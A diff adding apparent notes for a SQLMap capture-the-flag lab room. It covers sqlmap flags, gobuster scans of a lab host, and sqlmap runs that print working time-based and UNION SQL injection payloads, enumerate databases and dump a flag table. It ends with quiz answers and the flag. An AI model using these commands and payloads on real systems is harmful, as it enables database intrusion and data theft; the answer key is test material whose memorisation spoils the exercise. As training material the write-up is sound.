@@ -1,0 +1,502 @@
+SQLMAP.
+
+
+
+
+[>>> TASK 1: INTRODUCTION]
+[1.1. READ THE ABOVE AND HAVE SQL AT THE READY]
+Nothing to answer here.
+
+
+
+
+[>>> TASK 2: USING SQLMAP]
+[ACTION: check basic comands]
+sqlmap -h
+[OUTPUT]
+Usage: python3 sqlmap [options]
+
+Options:
+  -h, --help            Show basic help message and exit
+  -hh                   Show advanced help message and exit
+  --version             Show program's version number and exit
+  -v VERBOSE            Verbosity level: 0-6 (default 1)
+
+  Target:
+    At least one of these options has to be provided to define the
+    target(s)
+
+    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
+    -g GOOGLEDORK       Process Google dork results as target URLs
+
+  Request:
+    These options can be used to specify how to connect to the target URL
+
+    --data=DATA         Data string to be sent through POST (e.g. "id=1")
+    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
+    --random-agent      Use randomly selected HTTP User-Agent header value
+    --proxy=PROXY       Use a proxy to connect to the target URL
+    --tor               Use Tor anonymity network
+    --check-tor         Check to see if Tor is used properly
+
+  Injection:
+    These options can be used to specify which parameters to test for,
+    provide custom injection payloads and optional tampering scripts
+
+    -p TESTPARAMETER    Testable parameter(s)
+    --dbms=DBMS         Force back-end DBMS to provided value
+
+  Detection:
+    These options can be used to customize the detection phase
+
+    --level=LEVEL       Level of tests to perform (1-5, default 1)
+    --risk=RISK         Risk of tests to perform (1-3, default 1)
+
+  Techniques:
+    These options can be used to tweak testing of specific SQL injection
+    techniques
+
+    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
+
+  Enumeration:
+    These options can be used to enumerate the back-end database
+    management system information, structure and data contained in the
+    tables
+
+    -a, --all           Retrieve everything
+    -b, --banner        Retrieve DBMS banner
+    --current-user      Retrieve DBMS current user
+    --current-db        Retrieve DBMS current database
+    --passwords         Enumerate DBMS users password hashes
+    --dbs               Enumerate DBMS databases
+    --tables            Enumerate DBMS database tables
+    --columns           Enumerate DBMS database table columns
+    --schema            Enumerate DBMS schema
+    --dump              Dump DBMS database table entries
+    --dump-all          Dump all DBMS databases tables entries
+    -D DB               DBMS database to enumerate
+    -T TBL              DBMS database table(s) to enumerate
+    -C COL              DBMS database table column(s) to enumerate
+
+  Operating system access:
+    These options can be used to access the back-end database management
+    system underlying operating system
+
+    --os-shell          Prompt for an interactive operating system shell
+    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
+
+  General:
+    These options can be used to set some general working parameters
+
+    --batch             Never ask for user input, use the default behavior
+    --flush-session     Flush session files for current target
+
+  Miscellaneous:
+    These options do not fit into any other category
+
+    --wizard            Simple wizard interface for beginner users
+
+[!] to see full list of options run with '-hh'
+
+
+[NOTE: Basic commands]
+1. Target url (eg http://www.site.com/vuln.php?id=1):
+-u URL, --url=URL 
+2. Data string to send via POST (eg id=1):
+--data=DATA
+3. Use random http user-agent header value:
+--random-agent
+4.Testable parameters:
+-p TESTPARAMETER
+5. Level of test to perform (1-5, 1 default):
+--level=LEVEL
+6. Risk of tests to perform (1-3, 1 default):
+--risk=RISK
+
+
+[NOTE: enumeration commands]
+1. Retrieve everything:
+-a, -all
+2. Retrieve dbms banner:
+-b, -banner
+3. Retrieve dmbs current user:
+--current-user
+4. Retrieve dmbs current database:
+--current-db
+5. Enumerate dbms users password hashes:
+--passwords
+6. Enumerate dbms databases:
+--dbs
+7. Enumerate dbms database tables:
+--tables
+8. Enumerate dbms database table columns:
+--columns
+9.Enumerate dbms schema:
+--schema
+10. Dump dbms database table entries:
+--dump
+11. Dump all dbms database table entries:
+--dump-all
+12. Detect if the dbms current user is dba:
+--is-dba
+13. Dmbs database to enumerate:
+-D <DB_NAME>
+14. Dbms database tables to enumerate:
+-T <TABLE_NAME>
+15. Dbms database table columns to enumerate:
+-C COL
+
+
+[NOTE: os access commands]
+1. Prompt for interactive os shell:
+--os-shell
+2. Prompt for an oob shell, meterpreter or vnc:
+--os-pwn
+3. Execute an operating system command:
+--os-cmd=OSCMD
+4. Database process user privilege escalation:
+--priv-esc
+5. One-click prompt for oob shell, meterpreter or vnc:
+--os-smbrelay
+
+
+[COMMAND: database enumeration, simple http get test]
+sqlmap -u https://testsite.com/page.php?id=7 --dbs
+
+
+[STEPS: database enumeration, simple http post based request]
+1. Save vulnerable post request.
+2. Run: sqlmap -r <request_file> -p <vulnerable_parameter> --dbs
+[NOTE]
+Last 2 commands enumerate databases.
+
+
+[COMMAND: table extraction, get based method]
+sqlmap -u http://testsite.com/page.php?id=7 -D <database_name> --tables
+
+
+[COMMAND: table extraction, post based method]
+sqlmap -r <request_file> <vulnerable_parameter> -D <database_names> --tables
+[NOTE]
+Last 2 commands enumerate tables.
+
+
+[COMMAND: column enumeration, get based method]
+sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns
+
+
+[COMMAND: column enumeration, post based method]
+sqlmap -r <request_file> -D <database_name> -T <table_name> --columns
+[NOTE]
+Last 2 commands enumerate columns.
+
+
+[COMMAND: dump all dbs and tables, get based method]
+sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all
+
+
+[COMMAND: dump all dbs and tables, post based method]
+sqlmap -r <request_file> -D <database_name> --dump-all
+[NOTE]
+Last 2 commands dump all databases and tables.
+
+
+
+[2.1. WHICH FLAG OR OPTION WILL ALLOW YOU TO ADD A URL TO THE COMMAND?]
+[ANSWER]
+-u
+
+
+
+[2.2. WHICH FLAG WOULD YOU USE TO ADD DATA TO A POST REQUEST?]
+[ANSWER]
+--data
+
+
+
+[2.3. THERE ARE TWO PARAMETERS: username AND password. HOW WOULD YOU TELL SQLMAP TO USE THE USERNAME PARAMETER FOR THE ATTACK?]
+[ANSWER]
+-p username
+
+
+
+[2.4. WHICH FLAG WOULD YOU USE TO SHOW THE ADVANCED HELP MENU?]
+[ANSWER]
+-hh
+
+
+
+[2.5. WHICH FLAG ALLOWS YOU TO RETRIEVE EVERYTHING?]
+[ANSWER]
+-a
+
+
+
+[2.6. WHICH FLAG ALLOWS YOU TO SELECT THE DATABASE NAME?]
+[ANSWER]
+-D
+
+
+
+[2.7. WHICH FLAG WOULD YOU USE TO RETRIEVE DATABASE TABLES?]
+[ANSWER]
+--tables
+
+
+
+[2.8. WHICH FLAG ALLOWS YOU TO RETRIEVE A TABLE’S COLUMNS?]
+[ANSWER]
+--columns
+
+
+
+[2.9. WHICH FLAG ALLOWS YOU TO DUMP ALL THE DATABASE TABLE ENTRIES?]
+[ANSWER]
+--dump-all
+
+
+
+[2.10. WHICH FLAG WILL GIVE YOU AN INTERACTIVE SQL SHELL PROMPT?]
+[ANSWER]
+--sql-shell
+
+
+
+[2.11. YOU KNOW THE CURRENT DB TYPE IS 'MYSQL'. WHICH FLAG ALLOWS YOU TO ENUMERATE ONLY MYSQL DATABASES?]
+[ANSWER]
+--dbms=mysql
+
+
+
+
+[>>> TASK 3: SQLMAP CHALLENGE]
+[3.1. WHAT IS THE NAME OF THE INTERESTING DIRECTORY?]
+[ACTION: gobuster quick scan for common directories]
+gobuster dir -u http://10.10.243.99/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+[OUTPUT]
+/.hta                 (Status: 403) [Size: 178]
+/.htaccess            (Status: 403) [Size: 178]
+/.htpasswd            (Status: 403) [Size: 178]
+/index.html           (Status: 200) [Size: 612]
+[NOTE]
+Nothing useful.
+
+
+[ACTION: another gobuster scan for directories]
+gobuster dir -u http://10.10.243.99/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[OUTPUT]
+/blood                (Status: 301) [Size: 194] [--> http://10.10.243.99/blood/]
+[ANSWER]
+blood
+
+
+
+[3.2. WHO IS THE CURRENT DB USER?]
+[STEPS: get request file]
+1. Visit http://10.10.243.99/blood/ on burpsuite browser.
+2. Turn on proxy intercept.
+3. Attempt random login.
+4. Right click request > Copy to file (named it request.txt).
+5. Forward the request.
+
+
+[ACTION: check request file]
+cat request.txt
+[OUTPUT]
+POST /blood/nl-search.php HTTP/1.1
+Host: 10.10.243.99
+Content-Length: 16
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Origin: http://10.10.243.99
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.243.99/blood/
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=l4uvbfrsb1bd46sfimrmuhheb4
+Connection: keep-alive
+
+blood_group=A%2B
+
+
+[ACTION: enumerate current database]
+sqlmap -r request.txt -p blood_group --current-user
+[OUTPUT]
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.6#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:42:48 /2025-07-28/
+
+[18:42:48] [INFO] parsing HTTP request from 'request.txt'
+[18:42:48] [INFO] testing connection to the target URL
+[18:42:49] [INFO] checking if the target is protected by some kind of WAF/IPS
+[18:42:49] [INFO] testing if the target URL content is stable
+[18:42:49] [INFO] target URL content is stable
+[18:42:49] [WARNING] heuristic (basic) test shows that POST parameter 'blood_group' might not be injectable
+[18:42:49] [INFO] testing for SQL injection on POST parameter 'blood_group'
+[18:42:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[18:42:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[18:42:50] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[18:42:50] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[18:42:50] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[18:42:51] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[18:42:51] [INFO] testing 'Generic inline queries'
+[18:42:51] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[18:42:51] [WARNING] time-based comparison requires larger statistical model, please wait. (done)
+[18:42:51] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[18:42:52] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[18:42:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[18:43:02] [INFO] POST parameter 'blood_group' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n
+[18:44:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[18:44:08] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[18:44:08] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[18:44:08] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
+[18:44:09] [WARNING] reflective value(s) found and filtering out
+[18:44:09] [INFO] target URL appears to be UNION injectable with 8 columns
+[18:44:10] [INFO] POST parameter 'blood_group' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+POST parameter 'blood_group' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
+---
+Parameter: blood_group (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: blood_group=A+' AND (SELECT 8466 FROM (SELECT(SLEEP(5)))YlJD) AND 'OwMI'='OwMI
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: blood_group=A+' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7171627071,0x477a737a6d77774862736a686c7a51665a626154614d4865686f4a5a637a4d4f6a4b544c65434275,0x716a6b7671),NULL,NULL,NULL,NULL-- -
+---
+[18:44:20] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.10.3
+back-end DBMS: MySQL >= 5.0.12
+[18:44:21] [INFO] fetching current user
+current user: 'root@localhost'
+[18:44:21] [INFO] fetched data logged to text files under '/home/user0/.local/share/sqlmap/output/10.10.243.99'
+
+[*] ending @ 18:44:21 /2025-07-28/
+[ANSWER]
+root
+
+
+[ACTION: list databases]
+sqlmap -r request.txt -p blood_group --dbs
+[OUTPUT]
+[*] starting @ 18:50:16 /2025-07-28/
+
+[18:50:16] [INFO] parsing HTTP request from 'request.txt'
+[18:50:16] [INFO] resuming back-end DBMS 'mysql' 
+[18:50:16] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: blood_group (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: blood_group=A+' AND (SELECT 8466 FROM (SELECT(SLEEP(5)))YlJD) AND 'OwMI'='OwMI
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: blood_group=A+' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7171627071,0x477a737a6d77774862736a686c7a51665a626154614d4865686f4a5a637a4d4f6a4b544c65434275,0x716a6b7671),NULL,NULL,NULL,NULL-- -
+---
+[18:50:16] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.10.3
+back-end DBMS: MySQL >= 5.0.12
+[18:50:16] [INFO] fetching database names
+available databases [6]:
+[*] blood
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+[*] test
+
+[18:50:16] [INFO] fetched data logged to text files under '/home/user0/.local/share/sqlmap/output/10.10.243.99'
+
+[*] ending @ 18:50:16 /2025-07-28/
+
+
+[ACTION: list tables in blood directory]
+sqlmap -r request.txt -p blood_group -D blood --tables
+[OUTPUT]
+[*] starting @ 18:51:10 /2025-07-28/
+
+[18:51:10] [INFO] parsing HTTP request from 'request.txt'
+[18:51:10] [INFO] resuming back-end DBMS 'mysql' 
+[18:51:10] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: blood_group (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: blood_group=A+' AND (SELECT 8466 FROM (SELECT(SLEEP(5)))YlJD) AND 'OwMI'='OwMI
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: blood_group=A+' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7171627071,0x477a737a6d77774862736a686c7a51665a626154614d4865686f4a5a637a4d4f6a4b544c65434275,0x716a6b7671),NULL,NULL,NULL,NULL-- -
+---
+[18:51:10] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.10.3
+back-end DBMS: MySQL >= 5.0.12
+[18:51:10] [INFO] fetching tables for database: 'blood'
+[18:51:10] [WARNING] reflective value(s) found and filtering out
+Database: blood
+[3 tables]
++----------+
+| blood_db |
+| flag     |
+| users    |
++----------+
+
+[18:51:10] [INFO] fetched data logged to text files under '/home/user0/.local/share/sqlmap/output/10.10.243.99'
+
+
+[ACTION: grab flag]
+sqlmap -r request.txt -p blood_group -D blood -T flag --dump
+[OUTPUT]
+[*] starting @ 18:51:49 /2025-07-28/
+
+[18:51:49] [INFO] parsing HTTP request from 'request.txt'
+[18:51:49] [INFO] resuming back-end DBMS 'mysql' 
+[18:51:49] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: blood_group (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: blood_group=A+' AND (SELECT 8466 FROM (SELECT(SLEEP(5)))YlJD) AND 'OwMI'='OwMI
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: blood_group=A+' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7171627071,0x477a737a6d77774862736a686c7a51665a626154614d4865686f4a5a637a4d4f6a4b544c65434275,0x716a6b7671),NULL,NULL,NULL,NULL-- -
+---
+[18:51:49] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.10.3
+back-end DBMS: MySQL >= 5.0.12
+[18:51:49] [INFO] fetching columns for table 'flag' in database 'blood'
+[18:51:49] [INFO] fetching entries for table 'flag' in database 'blood'
+Database: blood
+Table: flag
+[1 entry]
++----+---------------------+--------+
+| id | flag                | name   |
++----+---------------------+--------+
+| 1  | thm{sqlm@p_is_L0ve} | flag   |
++----+---------------------+--------+
+
+[18:51:49] [INFO] table 'blood.flag' dumped to CSV file '/home/user0/.local/share/sqlmap/output/10.10.243.99/dump/blood/flag.csv'
+[18:51:49] [INFO] fetched data logged to text files under '/home/user0/.local/share/sqlmap/output/10.10.243.99'
+[ANSWER]
+thm{sqlm@p_is_L0ve}
